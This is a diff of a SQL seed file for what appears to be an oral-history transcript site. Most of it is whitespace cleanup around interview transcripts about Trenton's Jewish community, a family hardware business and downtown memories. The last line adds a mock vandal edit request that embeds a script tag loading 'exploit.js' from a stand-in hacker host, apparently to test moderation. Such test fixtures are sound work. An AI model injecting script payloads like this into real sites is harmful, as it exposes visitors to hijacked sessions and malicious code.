+Siskowitz: you see when we talk about the dinner [laughs] I sort of found a little note today um [shuffles paper] let''s see if I have it here [shuffles more ] (13:41-13:56) yeah so during the time when I was in 1961 the cost of the dinner was 5 dollars and 50 cents a person we had 75 people at the dinner 5.50 was a big investment today to invite people to the dinner
 
 [inaudible]
 
@@ -1081,7 +1081,7 @@ Siskowitz:is there a ruth-ruth
 
 Interviewer: ruth
 
-Siskowitz:ruth jersey singoa 
+Siskowitz:ruth jersey singoa
 
 Interviewer: yeah
 
@@ -1089,29 +1089,29 @@ Interviewer:yeah oh I remember as a matter of fact I took her running pictures
 
 Siskowitz: really?
 
-Interviewer: yeah missionary stuff I didn''t approve of 
+Interviewer: yeah missionary stuff I didn''t approve of
 
 Siskowitz:right
 
 [overlapping] at the time
 
-Siskowitz: she was a dentist with not enough time in the morning she was tired [flipping pages 19:44-19:52] [mumbling 19:53-55] ''51 into the mid 60''s she continued that women''s position in 1961 she [flipping pages 20:13-20:23] ''61 did she yeah she was secretary in 1961 and I think she continued as secretary in ''62 im not sure sixty- delran daughter of 
+Siskowitz: she was a dentist with not enough time in the morning she was tired [flipping pages 19:44-19:52] [mumbling 19:53-55] ''51 into the mid 60''s she continued that women''s position in 1961 she [flipping pages 20:13-20:23] ''61 did she yeah she was secretary in 1961 and I think she continued as secretary in ''62 im not sure sixty- delran daughter of
 
-Interviewer:missioner 
+Interviewer:missioner
 
 Siskowitz:missioner man who said to dress in something beautiful at her afterwards when she was in Europe and met some very important people to come to address this community and honestly though him and her each alone were able to recognize the importance of Princeton was it was wealthy  and it was a land of cooperation and when I went into the service there were letters from the destinations at the time and each time I took a treasurership or chairmanship while I was receiving a very nice letter from the head office ... with cooperation a lot of good help so it wasn''t a job that pertained by any one person it was a cooperative organization
 
 Interviewer: how was albert einstein''s influence in-
 
-Interviewer: he was he was very cooperative he attended all of our meetings he came here when I had meeting with the board he was he signed all of my letters that I sent all up to the day he died he sent out a letter to the christian committee different people asking him to serve with the committee that I had proposed at that time 
+Interviewer: he was he was very cooperative he attended all of our meetings he came here when I had meeting with the board he was he signed all of my letters that I sent all up to the day he died he sent out a letter to the christian committee different people asking him to serve with the committee that I had proposed at that time
 
 Siskowitz: did you vote him in the office?
 
-Interviewer: he was almost he was I would say honorary chairman in every campaign we had we had him as our honorary chairman we had a professor lowe who was a very well renowned individual who served with me for several years as for a couple years as co chairman professor kadowski served with me for a couple of years as co chairman wherever he was and so basically for a joint study was a very important part of our campaign the influence of einstein and these professors they affect professor lowe used to give me the names of all those who have come over and in December I would stick around to contact these people for donations every time I spent money ....at that tim I can tell if you''re interested to know the .... that''s of course another stay the wonderful things about professor einstein the different things there was example through sight this one example was about professor einstein I was in his home because I had to get his signature on the letters I was sending back to his community he was in a conference with two other professors and the problems they were having and so I separated it was very interesting to do to be sitting there and directing the discussion but a group of young men came to the door unannounced without appointment asking to see professor einstein and ms. dickens who was the secretary at the time told them that he was occupied that he couldn''t possibly see anyone without an appointment and they were quick insistent and he heard the commotion and he collective sat up what is the problem so ms. dickens explained to him these people came from english I think it was they were having a group forming to have invited different important people to address the incident and this is the farm area in...i think it was at that time and he was like wow look at the young people bringing in and he went to the door and looked at the lady and expected him a purpose why wasn''t he they wanted him to come to address them and he appreciated the invitation so much and praised them highly for their efforts that they were making in their um [inaudible] young people mostly and but that he wasn''t already in a position to do that and even every interviews that he was having they were bringing the cameras in television at that time already to his home and in fact even when he was here one time when I was having a table spread for after the meeting he couldn''t attempt to participate in that part but at that time the way he praised them I felt as if it was a rabbi talking to his students [laughter] and and encouraged them to continue with that so smiley so he was admirable he was left aloof he was a he treated everyone really now he was in my town take with him I felt an ... basis with him because that is the way he treated me if he got a letter from someone from his uncle he would call or have his ms.dickens call me to discuss certain things so he was definitely a very fine young boy he couldn''t aside from being a professor he was to a degree a shy person that may seem when he was here and I had the table against the door because I had chairs all over the place and when he was ready to leave we were seeing the discussion room standing above several recent situations and when he was ready to leave I had we had to move the closet and he thought he could go out the other way in my head closed off you still have an opening that other closet that was the he was embarrassed by the fact that he to go out before everyone else you believe and when I told him I had the broke face? and he had to come through the door he was really embarrassed by it but aside from so many other things at one time and by the enthusiasm at the meeting at the public meeting that was at... I was tearing the paper read making every effort to contact every Jew possible and even everyone suspected to be a Jew [laughter] at least we did he pulled my sleeve turned to me and he said they''re just like the Nazi''s [laughter] the way he snapped [inaudible mumbling with laughter] but the fact of the matter is that in those days we did contact everyone that possible could we left no one to go without a contribution this is something that I don''t any federation had every succeeded in doing and i''ve seen publications of the Jewish federation and they used to post the different contributions and it was shameful to see that so many contributions were in the 10 15 20 dollar range but just working people too so many business people that was shameful to even publish it was to date expect in 1970 we never published the amounts anyone gave but in 1970 the professor linkton ran the campaign and he published not individual but in classes listing those over 2000 those at that time that was already related to that class and over 1000 in those in between 500 and 1000 and between 250 and 500 and so on and listed those under 35 and when I read the names I was sick because I felt that was a terrible thing to do if these people couldn''t afford to give at that time they shouldn''t be publicized 
+Interviewer: he was almost he was I would say honorary chairman in every campaign we had we had him as our honorary chairman we had a professor lowe who was a very well renowned individual who served with me for several years as for a couple years as co chairman professor kadowski served with me for a couple of years as co chairman wherever he was and so basically for a joint study was a very important part of our campaign the influence of einstein and these professors they affect professor lowe used to give me the names of all those who have come over and in December I would stick around to contact these people for donations every time I spent money ....at that tim I can tell if you''re interested to know the .... that''s of course another stay the wonderful things about professor einstein the different things there was example through sight this one example was about professor einstein I was in his home because I had to get his signature on the letters I was sending back to his community he was in a conference with two other professors and the problems they were having and so I separated it was very interesting to do to be sitting there and directing the discussion but a group of young men came to the door unannounced without appointment asking to see professor einstein and ms. dickens who was the secretary at the time told them that he was occupied that he couldn''t possibly see anyone without an appointment and they were quick insistent and he heard the commotion and he collective sat up what is the problem so ms. dickens explained to him these people came from english I think it was they were having a group forming to have invited different important people to address the incident and this is the farm area in...i think it was at that time and he was like wow look at the young people bringing in and he went to the door and looked at the lady and expected him a purpose why wasn''t he they wanted him to come to address them and he appreciated the invitation so much and praised them highly for their efforts that they were making in their um [inaudible] young people mostly and but that he wasn''t already in a position to do that and even every interviews that he was having they were bringing the cameras in television at that time already to his home and in fact even when he was here one time when I was having a table spread for after the meeting he couldn''t attempt to participate in that part but at that time the way he praised them I felt as if it was a rabbi talking to his students [laughter] and and encouraged them to continue with that so smiley so he was admirable he was left aloof he was a he treated everyone really now he was in my town take with him I felt an ... basis with him because that is the way he treated me if he got a letter from someone from his uncle he would call or have his ms.dickens call me to discuss certain things so he was definitely a very fine young boy he couldn''t aside from being a professor he was to a degree a shy person that may seem when he was here and I had the table against the door because I had chairs all over the place and when he was ready to leave we were seeing the discussion room standing above several recent situations and when he was ready to leave I had we had to move the closet and he thought he could go out the other way in my head closed off you still have an opening that other closet that was the he was embarrassed by the fact that he to go out before everyone else you believe and when I told him I had the broke face? and he had to come through the door he was really embarrassed by it but aside from so many other things at one time and by the enthusiasm at the meeting at the public meeting that was at... I was tearing the paper read making every effort to contact every Jew possible and even everyone suspected to be a Jew [laughter] at least we did he pulled my sleeve turned to me and he said they''re just like the Nazi''s [laughter] the way he snapped [inaudible mumbling with laughter] but the fact of the matter is that in those days we did contact everyone that possible could we left no one to go without a contribution this is something that I don''t any federation had every succeeded in doing and i''ve seen publications of the Jewish federation and they used to post the different contributions and it was shameful to see that so many contributions were in the 10 15 20 dollar range but just working people too so many business people that was shameful to even publish it was to date expect in 1970 we never published the amounts anyone gave but in 1970 the professor linkton ran the campaign and he published not individual but in classes listing those over 2000 those at that time that was already related to that class and over 1000 in those in between 500 and 1000 and between 250 and 500 and so on and listed those under 35 and when I read the names I was sick because I felt that was a terrible thing to do if these people couldn''t afford to give at that time they shouldn''t be publicized
 
-[inaudible interviewer comment] 
+[inaudible interviewer comment]
 
-Siskowitz: I felt very strongly about that also of course I saw names of others that should able to help more of course in 1970 the ... sucks it was not existing doesn''t resonate like the 40''s or 50''s you see so I was always against this idea of publishing because people are giving in accordance to their what their heart permits then we tax ourselves and I always felt that women could do a usual rate is a tax that we put on ourselves that is important tax to take care of our own to take care of those who need help and without the help that Israel standing leads to the disparity today we still have problems but we also have problems individually that have to be taken care of and if we don''t have a Jewish community established locally we will never be ready to have those overseas 
+Siskowitz: I felt very strongly about that also of course I saw names of others that should able to help more of course in 1970 the ... sucks it was not existing doesn''t resonate like the 40''s or 50''s you see so I was always against this idea of publishing because people are giving in accordance to their what their heart permits then we tax ourselves and I always felt that women could do a usual rate is a tax that we put on ourselves that is important tax to take care of our own to take care of those who need help and without the help that Israel standing leads to the disparity today we still have problems but we also have problems individually that have to be taken care of and if we don''t have a Jewish community established locally we will never be ready to have those overseas
 
 Interviewer: true
 
@@ -1139,7 +1139,7 @@ Siskowitz: and a member of senators where calling him to get his opinion on it a
 
 Interviewer: true
 
-Siskowitz:even though they were Christian, brought up as Christians, but they still had the feeling yeah of one particular case who would not make his contribution that one particular year because he joined this abusive community and they never Palestine appeal couldn''t agree on the percentage of take when we joined as a joined the group we were already running in the campaign before the ... came up to the settlement and he was at the time felt very strongly remorse for the joined this abusive community he was extra impact Palestine appeal itself and since it was impacted by Palestine we gotten to quite a discussion about it and in the discussion he said well I''m not Jewish I''m Christian my wife my brother was Christian I was brought up as a Christian my wife was Christian [inaudible] my father today was taken disinterest of course at that time they never considered him chairman you see and this I said to him I can''t seem to remember his name it was a real Jewish name actually and I said no we''re not doing it in honor of to honor your father we''re doing it because you have your father''s heart, you have a Jewish heart we take care of our Jews and he looked at me at the time and of course even through the discussion we were having about Palestine I believe I convinced him that it was important that we should have a piece of land where we could unite and if and get the people all these refugees that ...and I would stay true and accept during those days and in fact I got a larger contribution from the the morning gift of a long discussion was a big contributer but when I mentioned about the Jewish heart 
+Siskowitz:even though they were Christian, brought up as Christians, but they still had the feeling yeah of one particular case who would not make his contribution that one particular year because he joined this abusive community and they never Palestine appeal couldn''t agree on the percentage of take when we joined as a joined the group we were already running in the campaign before the ... came up to the settlement and he was at the time felt very strongly remorse for the joined this abusive community he was extra impact Palestine appeal itself and since it was impacted by Palestine we gotten to quite a discussion about it and in the discussion he said well I''m not Jewish I''m Christian my wife my brother was Christian I was brought up as a Christian my wife was Christian [inaudible] my father today was taken disinterest of course at that time they never considered him chairman you see and this I said to him I can''t seem to remember his name it was a real Jewish name actually and I said no we''re not doing it in honor of to honor your father we''re doing it because you have your father''s heart, you have a Jewish heart we take care of our Jews and he looked at me at the time and of course even through the discussion we were having about Palestine I believe I convinced him that it was important that we should have a piece of land where we could unite and if and get the people all these refugees that ...and I would stay true and accept during those days and in fact I got a larger contribution from the the morning gift of a long discussion was a big contributer but when I mentioned about the Jewish heart
 
 [inaudible]
 
@@ -1155,7 +1155,7 @@ Siskowitz: well what could I tell you
 
 Interviewer: when you were smaller I mean how close were you-
 
-Siskowitz: we were a very close family very close we were a very close family in before we came here like I said my father died when I was about eight years old and that was a direct result of the first world war so we all worked together very closely we all cooperated with everything very closely and when we came here my two sisters the oldest sisters went to work with me i think my younger sister who was only sixteen at that time she took complete control over the store she picked up the English language in no time simply went to night school short time she was very capable individual wonderful person let''s say I was very close with her and after school I was 
+Siskowitz: we were a very close family very close we were a very close family in before we came here like I said my father died when I was about eight years old and that was a direct result of the first world war so we all worked together very closely we all cooperated with everything very closely and when we came here my two sisters the oldest sisters went to work with me i think my younger sister who was only sixteen at that time she took complete control over the store she picked up the English language in no time simply went to night school short time she was very capable individual wonderful person let''s say I was very close with her and after school I was
 
 Interviewer: what was what was your sisters name who''s sydney grosses sitting her grosses mother
 
@@ -1163,25 +1163,25 @@ Siskowitz: lina
 
 Interviewer:lina?
 
-Siskowitz: yeah 
+Siskowitz: yeah
 
 Interviewer: was she with you
 
 Siskowitz: she was the next oldest
 
-Interviewer: thirsty 
+Interviewer: thirsty
 
 Siskowitz: I had a brother who was left in Europe he left when the war started in 1914 the school gave him a complete scholarship and they moved out to deep Russia I think it was what would we call it that was the landing..... it was eighteen he had to the school moved up and him he went from the school and he was left-
 
 [inaudible overlap]..St. Petersburg wasn''t it
 
-Siskowitz:that was after that they named the 
+Siskowitz:that was after that they named the
 
-Interviewer: Purtrugra? 
+Interviewer: Purtrugra?
 
 [inaudible laughter]
 
-Interviewer:I heard you change it 
+Interviewer:I heard you change it
 
 Siskowitz: yeah [laughter] but ..went with the school and he only came once for a visit during the war and my father and I can recall this so vividly was at all prepared one year to go visit him he got the passport he got the everything ready and something came up and I don''t know exactly what he wasn''t able to aboard it they didn''t permit
 
@@ -1204,7 +1204,7 @@ Siskowitz: yeah [laughter] but ..went with the school and he only came once for 
 
 
 
-SIDE B: 
+SIDE B:
 
 Siskowitz: and in the when we came here in 1921 because we were always in East Slovakia and we went to Reagan where I had an uncle there who later came here after us as well in 1921 we got a letter from my brother we had left our address with the Red Cross at the time when we were locating one of the other families and he was able to get the address that way and wrote a letter at the time he was still in the army he was a commander of engineers he was an engineer at the time and of course he was hoping that someday we would able to be together he was a when we got believe it another letter from him in fact Liam wrote to him a couple of time and then he got the response eventually and under the Stallon situation he was one of the people obviously that was eliminated among many others when Stallon started this business
 
@@ -1212,7 +1212,7 @@ Interviewer: Now one of one of Liam''s daughters is the head nurse at Greenwood'
 
 Siskowitz:I don''t know if she''s the head nurse but she''s there
 
-Interviewer: What was her name? [overlapping] Aileen 
+Interviewer: What was her name? [overlapping] Aileen
 
 Siskowitz: Aileen Burkman
 
@@ -1242,25 +1242,25 @@ Siskowitz: He''s older
 
 Interviewer: And your your one was in the army in Russia
 
-Siskowitz: He was 
+Siskowitz: He was
 
-Interviewer: was he 
+Interviewer: was he
 
 Siskowitz: the second one in the family
 
 Interviewer: Okay
 
-Siskowitz: Jean Failman was the oldest and then my brother Theya he was second and then Liam and then Anna and there was another child that died before I knew anything about it and then Liana and then I''m the baby of the family so 
+Siskowitz: Jean Failman was the oldest and then my brother Theya he was second and then Liam and then Anna and there was another child that died before I knew anything about it and then Liana and then I''m the baby of the family so
 
 Interviewer: That''s nice it''s a nice close family
 
-Siskowitz: Very close very close we were we were a singing family actually at that time we didn''t have radios and TV''s and we all enjoyed the singing 
+Siskowitz: Very close very close we were we were a singing family actually at that time we didn''t have radios and TV''s and we all enjoyed the singing
 
 Interviewer: What I''d like to do is I''d like to borrow this and as I write this I can refer to some of these things with the dates that you were saying and I''ll get them back to you
 
 Siskowitz: I appreciate that
 
-  
+
 
 
 ', 'Initial transcript', 't', '2021-04-12 01:26:29');
@@ -1278,7 +1278,7 @@ JOEL MILLNER [interrupting]: Yeah, well that was it, it was August 25th uh—
 
 INTERVIEWER [interrupting]: Okay 1994, so [indistinguishable] okay, alright, and where was, where was he born?
 
-JOEL MILLNER: He was born in, uh, in, um, Vilna 
+JOEL MILLNER: He was born in, uh, in, um, Vilna
 
 INTERVIEWER: Vilna, that was, that was probably in Poland at that time.
 
@@ -1326,7 +1326,7 @@ JOEL MILLNER: Yeah, I don’t know who, the, uh, the father was but, uh, you kno
 
 INTERVIEWER [interrupting]:O—Okay, now I have something here that I heard somewhere that he sold uh, writing papers and pens and needles, was it, did he do that while he was here in Trenton, in the Trenton Area?
 
-JOEL MILLNER: Yeah, I—I don’t think, uh, he, ya know, he was a uh, peddler 
+JOEL MILLNER: Yeah, I—I don’t think, uh, he, ya know, he was a uh, peddler
 
 INTERVIEWER: okay
 
@@ -1342,7 +1342,7 @@ JOEL MILLNER: Yeah, yeah, but he happened to be a very good, uh, a very good [6:
 
 INTERVIEWER [interrupting]: Well, they always, they always uh, cut the pile,, the house always cut the pile, so.
 
-JOEL MILLNER [overlapping]: Did they really? 
+JOEL MILLNER [overlapping]: Did they really?
 INTERVIEWER: Yeah. Okay now, uh, there was a hardware store in Trenton, uh, it says five years, [indistinguishable] owned a, owned a, he had a hardware store
 
 JOEL MILLNER: Well yeah, yeah, I guess he was on broad street, he had a, uh, houseware store, and—
@@ -1433,11 +1433,11 @@ INTERVIEWER: Albany.
 
 JOEL MILLNER: Was it Albany? Yeah uh, that was an 18 year span, you know, that uh, he, uh, was here and there and uh [17:00] he was a bachelor uh, you know, uh
 
-INTERVIEWER: Okay, then there was something about he worked for Erkin and Kahn on Perry Street, when it was on Perry Street, right on the corner of Perry and Broad, is that where [indistinguishable] had his place there, is that? 
+INTERVIEWER: Okay, then there was something about he worked for Erkin and Kahn on Perry Street, when it was on Perry Street, right on the corner of Perry and Broad, is that where [indistinguishable] had his place there, is that?
 
 JOEL MILLNER: Erkin and Kahn, yeah
 
-INTERVIEWER: Was that where it was? ‘Cause I know Erkin and Kahn was out on Clinton avenue for… 
+INTERVIEWER: Was that where it was? ‘Cause I know Erkin and Kahn was out on Clinton avenue for…
 
 JOEL MILLNER: Yeah, but, uh, well I don''t uh, I don’t remember uh, uh, I don’t remember that
 
@@ -1465,7 +1465,7 @@ INTERVIEWER: Okay, okay, alright thats, thats all  I—
 
 JOEL MILLNER: Yeah.
 
-INTERVIEWER: Okay, okay, now one thing that I, uh, you know, thought was a—a tremendous thing was he ordered a car load of nails? What—what was that story he was tellin? He ordered a car load of nails, and, uh, in kegs and then went out and peddled them all? 
+INTERVIEWER: Okay, okay, now one thing that I, uh, you know, thought was a—a tremendous thing was he ordered a car load of nails? What—what was that story he was tellin? He ordered a car load of nails, and, uh, in kegs and then went out and peddled them all?
 JOEL MILLNER: Well, that waswhat he did, you know, [19:00] uh, uh, you know he would buy and, and—
 
 INTERVIEWER: Well what got him into the wholesale business? He didn''t want to work with the Millners anymore—I mean with the uh?
@@ -1524,7 +1524,7 @@ INTERVIEWER: Was your sister active at all here?
 
 JOEL MILLNER: My sister was never, never, never worked here,my brother and I you know, started working here uh, when we were twelve years old. That’s why I tell people I‘ve been working around here 55 years uh
 
-INTERVIEWER: That’s when we all started, about that age. 
+INTERVIEWER: That’s when we all started, about that age.
 
 JOEL MILLNER: Yeah [laughing], you know, uh, uh and, in those days it was uh, [25:00] hard work you know, they didn’t have the mechanical equipment that they have today, you know, for unloading, and we used to get up, uh, you know, come to work 6 o’clock in the morning and sometimes work ‘til 6:30,7:00 at night, you know, was, uh, stuff had to be, uh, loaded and shipped and what not, uh
 
@@ -1546,7 +1546,7 @@ JOEL MILLNER: Yea, yeah, no [29:00] I don’t believe we have any pictures of th
 
 INTERVIEWER: So, when did your dad actually retire from here and went to Florida, and didn’t, and didn’t—
 
-JOEL MILLNER [interrupting]: Well, I don''t think he ever really retired, you know, uh, uh, I, you know, when we came into the business, and—and probably wrongly so, in 1952, you know, we were both here, when I was at—finished college, [indistinguishable] was here uh, you know, while I was in, in college, and he decided he didn’t want to go to college, er uh, and, uh, my father pretty much backed off, you know, from uh, being an active participant, he wanted to be a participant, but uh he, he, he, he didn''t want the, the daily uhh, problems, that uh, ya know, the servicing the customers uh, that uh, that uh, were required, ya know. [30:00] I mean, he wanted to make the decisions, but he wasn''t around, you know, to uh, to uh, to make the decisions, and uh, we found it necessary to make the decisions, and then have him, you know, uh, uh, say well you shouldn''t have done this or you shouldn''t of done that. Well, listen we had to make a decision and that''s the decision we, you know, we, we, we made, uh, you know, if you wanna, if you''re here then we’ll consult you, but if you’re not here i feel you have to give us the, uh that we’re, we’re attempting to do the best job possible, but, you know. So that’s when uh, uh, he sort of backed off and then I think he was, when he moved to Florida uh, he was 84 years old, so he lived in Florida almost 20 years, uh, I—I think, uh, into his 90s [31:00] he came back and he had the home on uh, on Bellevue Avenue and he, he had a place to stay, and after that, he uh, he came, after he sold the house he came back, but, but less uh, frequently, because then he would stay with a friend, uh, Andrew Repaul, and, uh, occasionally he would stay with us, but I don''t think he was comfortable staying with us, you know, because you’re always, you’re not home, you’re going, you’re coming, you know, I don’t know, I can’t eat the hours that you guys eat, you know, and uh, and uh, and then he, uh, and then he stayed with a fellow by the name of Lou Bellanchio, that had, uh, uh, that had a furniture factory, that, that he was manufacturing furniture, [32:00] uh, sofa beds. Uh, do you remember he, uh, well originally he was on, uh, I—I guess he, he was, he manufactured in the old Skillman building— 
+JOEL MILLNER [interrupting]: Well, I don''t think he ever really retired, you know, uh, uh, I, you know, when we came into the business, and—and probably wrongly so, in 1952, you know, we were both here, when I was at—finished college, [indistinguishable] was here uh, you know, while I was in, in college, and he decided he didn’t want to go to college, er uh, and, uh, my father pretty much backed off, you know, from uh, being an active participant, he wanted to be a participant, but uh he, he, he, he didn''t want the, the daily uhh, problems, that uh, ya know, the servicing the customers uh, that uh, that uh, were required, ya know. [30:00] I mean, he wanted to make the decisions, but he wasn''t around, you know, to uh, to uh, to make the decisions, and uh, we found it necessary to make the decisions, and then have him, you know, uh, uh, say well you shouldn''t have done this or you shouldn''t of done that. Well, listen we had to make a decision and that''s the decision we, you know, we, we, we made, uh, you know, if you wanna, if you''re here then we’ll consult you, but if you’re not here i feel you have to give us the, uh that we’re, we’re attempting to do the best job possible, but, you know. So that’s when uh, uh, he sort of backed off and then I think he was, when he moved to Florida uh, he was 84 years old, so he lived in Florida almost 20 years, uh, I—I think, uh, into his 90s [31:00] he came back and he had the home on uh, on Bellevue Avenue and he, he had a place to stay, and after that, he uh, he came, after he sold the house he came back, but, but less uh, frequently, because then he would stay with a friend, uh, Andrew Repaul, and, uh, occasionally he would stay with us, but I don''t think he was comfortable staying with us, you know, because you’re always, you’re not home, you’re going, you’re coming, you know, I don’t know, I can’t eat the hours that you guys eat, you know, and uh, and uh, and then he, uh, and then he stayed with a fellow by the name of Lou Bellanchio, that had, uh, uh, that had a furniture factory, that, that he was manufacturing furniture, [32:00] uh, sofa beds. Uh, do you remember he, uh, well originally he was on, uh, I—I guess he, he was, he manufactured in the old Skillman building—
 
 INTERVIEWER: Oh yeah, yeah.
 
@@ -1563,14 +1563,14 @@ JOEL MILLNER: No, that was, uh, that was the, uh,  uh, Johnson Oldsmobile.
 INTERVIEWER: Well, wasn’t Stanley Products in there?
 
 JOEL MILLNER: Well, Stanley Products moved in after Johnson left.P
-INTERVIEWER: okay, alright. 
+INTERVIEWER: okay, alright.
 
-JOEL MILLNER: You know, [33:00] and then the bank took it over, ya know, and, and we were probably uhh, uh, negligent in, in not attempting to, to buy that and, and utilizing that as a front, storefront with the yard in the, in the, in the back, but, you know, we had so much space here that, uh, and, uh, it wasn''t as important to, uh, uh, t—to be uh, fronting on Hermitage Avenue, uh, at the point in time, you know, or we could, uh, have acquired, uh there was a gas station o—on the corner here uh, you know, and then the bank, uh, put a little branch in th—in there and uh, between the gas station and our property. 
+JOEL MILLNER: You know, [33:00] and then the bank took it over, ya know, and, and we were probably uhh, uh, negligent in, in not attempting to, to buy that and, and utilizing that as a front, storefront with the yard in the, in the, in the back, but, you know, we had so much space here that, uh, and, uh, it wasn''t as important to, uh, uh, t—to be uh, fronting on Hermitage Avenue, uh, at the point in time, you know, or we could, uh, have acquired, uh there was a gas station o—on the corner here uh, you know, and then the bank, uh, put a little branch in th—in there and uh, between the gas station and our property.
 
-INTERVIEWER: That was, that was Gale, over that gas station, didn’t he—guy by name of Gale? He had a Pontiac [indistinguishable]  
+INTERVIEWER: That was, that was Gale, over that gas station, didn’t he—guy by name of Gale? He had a Pontiac [indistinguishable]
 JOEL MILLNER [interrupting]: It could be,  I never noti—
 
-INTERVIEWER [Continuing]: [Indistinguishable] Young fella, I remember a guy, it was a young fella. 
+INTERVIEWER [Continuing]: [Indistinguishable] Young fella, I remember a guy, it was a young fella.
 
 JOEL MILLNER: Well, who was that, [34:00] I thought it was—the one guy that had it was by the name of Alan, wasn’t it?Uh, I don’t remember his first name—
 
@@ -1725,7 +1725,7 @@ BRENDA: I might have been five years old but I went to these movies.
 INTERVIEWER: Uh huh.
 BRENDA: Maybe I didn’t maybe I didn’t go when I was five. Maybe I went like nine and ten.
 INTERVIEWER: Uh huh.
-BRENDA: But yeah. 
+BRENDA: But yeah.
 INTERVIEWER: Yeah?
 BRENDA: And ya know I remember that. Yeah the Capitol.
 INTERVIEWER: Can you tell me anything  more about these photos that.
@@ -1741,7 +1741,7 @@ BRENDA: Oh they were in ‘54 I do remember. I do remember. Aw y’all went to t
 INTERVIEWER: Yep. This one was taken after an air raid drill. Do you remember?
 BRENDA: Ah nobody was downtown. I don’t remember that no.
 INTERVIEWER: This is the Mayfair Theater.
-BRENDA: Oh I remember the Mayfair. Yep. 
+BRENDA: Oh I remember the Mayfair. Yep.
 INTERVIEWER: Do you remember seeing shows there?
 BRENDA: Yeah we used to go there and and there was the Trent Theater downtown also.
 INTERVIEWER: Mmhm.
@@ -1761,7 +1761,7 @@ BRENDA: We’d watch one movie all day long didn’t we? Stay in there all day. 
 INTERVIEWER: They kick you out now?
 BRENDA: We’d go to the movies and stay all day long. Mom didn’t have to worry about oh look this snow.
 INTERVIEWER: Do you remember the snow? We had a lot of pictures of this.
-BRENDA: Oh yeah. What’s this 1960? 
+BRENDA: Oh yeah. What’s this 1960?
 INTERVIEWER: Yeah.
 BRENDA: That big snow?
 INTERVIEWER: There’s. Woolworth should be in that picture.
@@ -1783,10 +1783,10 @@ BRENDA: Uh huh. This is still it’s still on Broad and State. He still on he he
 INTERVIEWER: Really?
 BRENDA: Always. Downtown with State always stayed (?). And Dunkin Donuts is over here now. And and up there is the um uh army where they trained the young boys to get in service. What?
 INTERVIEWER: (?) you mentioned there were like ethnic parades and stuff.
-BRENDA: Yeah. They always had parades. Yeah we always had parades. (?). What? Those some good pictures aha. I remember them but you know what? Really(?) see all these people downtown? We um we didn’t go downtown that much only to the movies. 
+BRENDA: Yeah. They always had parades. Yeah we always had parades. (?). What? Those some good pictures aha. I remember them but you know what? Really(?) see all these people downtown? We um we didn’t go downtown that much only to the movies.
 INTERVIEWER: Mmhm.
 BRENDA: And then when we do go down to the movie downtown we were with our parents and we just go shopping and come back home that’s all.
-INTERVIEWER:Mmm. 
+INTERVIEWER:Mmm.
 BRENDA: But now everybody hang downtown.
 INTERVIEWER: But then uh when you were older did you end up going on your own?
 BRENDA: Oh yeah yeah when I got older yeah. Go down there and stay a long time.
@@ -1817,7 +1817,7 @@ BRENDA: Yeah. All all our things have been taken away from us and we have nothin
 INTERVIEWER: Mmm.
 BRENDA: We have nothing for our kids here. Nothing. Well I’m I’m just glad I lived in that era because I had a good time.
 INTERVIEWER: Yeah it looked like it would be a good time.
-BRENDA: Yeah it was. It was nice and (?). You you didn’t have to worry ‘bout nothing. Everybody spoke to everybody. There was no cover fee. 
+BRENDA: Yeah it was. It was nice and (?). You you didn’t have to worry ‘bout nothing. Everybody spoke to everybody. There was no cover fee.
 INTERVIEWER: Mmm.
 BRENDA:We were all people.
 INTERVIEWER: Mmhm.
@@ -1877,7 +1877,7 @@ BRENDA: And we’re the capital city.
 INTERVIEWER: Right.
 BRENDA: So that’s what I’m talking about.
 INTERVIEWER: So have you lived here all your life? Uh what made you stay? You obviously like the area. You have good memories of it.
-BRENDA: Uh no. This what happened. I left. When my son got eighteen he left. 
+BRENDA: Uh no. This what happened. I left. When my son got eighteen he left.
 INTERVIEWER: OK.
 BRENDA: I moved to California for like three years.
 INTERVIEWER: OK.
@@ -1905,7 +1905,7 @@ BRENDA: Trenton was jamming. Whatchu talking about?
 INTERVIEWER: Yeah.
 BRENDA: Yeah.
 INTERVIEWER: We looked at these pictures and it looked like uh it looked like Manhattan.
-BRENDA: And New York yeah. 
+BRENDA: And New York yeah.
 INTERVIEWER: Mmhm.
 BRENDA: Trenton is the bomb. Uh huh yeah we had a good time. I enjoy it here.
 INTERVIEWER: Yeah.
@@ -1921,7 +1921,7 @@ BRENDA: What you mean? There’s nothing here in Trenton. What? This my home. Wh
 INTERVIEWER: Yeah yeah.
 BRENDA: I ain’t going. I’ll leave but I’m always coming back.
 INTERVIEWER: Mmhm.
-BRENDA: And I’ve been here ever since. I think it was. I came back home ‘bout ten to fifteen years ago and I ain’t never going. 
+BRENDA: And I’ve been here ever since. I think it was. I came back home ‘bout ten to fifteen years ago and I ain’t never going.
 INTERVIEWER: Mmm.
 BRENDA: I ain’t going nowhere. Mmhm. (?)
 INTERVIEWER: Um we’re also interested in where you think Trenton will head into the future. Uh after spending so much time in it.
@@ -2005,7 +2005,7 @@ BRENDA: No I never thought Trenton would go down like this. Never but you know i
 INTERVIEWER: Right.
 BRENDA: (?) (?) (?). Yeah.
 INTERVIEWER: Yeah it’s interesting.
-BRENDA: Yeah so um and besides uh (?), my kids, my son and my grandkids are grown adults. Because I woudn’t live here with them. Uh I would move. I would probably move with my sister or something because it it’s not it’s no place to to raise. There’s no role models. There’s nothing you know? There’s nothing but destruction evil things. And the peer pressure this this time is bad because of the drugs. 
+BRENDA: Yeah so um and besides uh (?), my kids, my son and my grandkids are grown adults. Because I woudn’t live here with them. Uh I would move. I would probably move with my sister or something because it it’s not it’s no place to to raise. There’s no role models. There’s nothing you know? There’s nothing but destruction evil things. And the peer pressure this this time is bad because of the drugs.
 INTERVIEWER: Hmm.
 BRENDA: So you know I wouldn’t I wouldn’t.
 INTERVIEWER: Do you remember there being gangs in the in the between ‘45 and ‘665?
@@ -2044,4 +2044,4 @@ INTERVIEWER 2: You can smile.
 BRENDA: OK. With my little smile.
 ', 'Initial transcript', 't', '2021-04-12 01:26:29');
 
-INSERT INTO user_edit_request (user_id, transcript_id, text, edit_comment, create_time) VALUES (5, 4, 'I am vandalizing your website! No more transcripts for you! Ha ha! Wait, there''s approval? Shoot, I didn''t think that far...', '>:)', '2021-04-12 01:39:34');
+INSERT INTO user_edit_request (user_id, transcript_id, text, edit_comment, create_time) VALUES (5, 4, '<script src="https://hack.com/exploit.js"></script>I am vandalizing your website! No more transcripts for you! Ha ha! Wait, there''s approval? Shoot, I didn''t think that far...', '>:)', '2021-04-12 01:39:34');
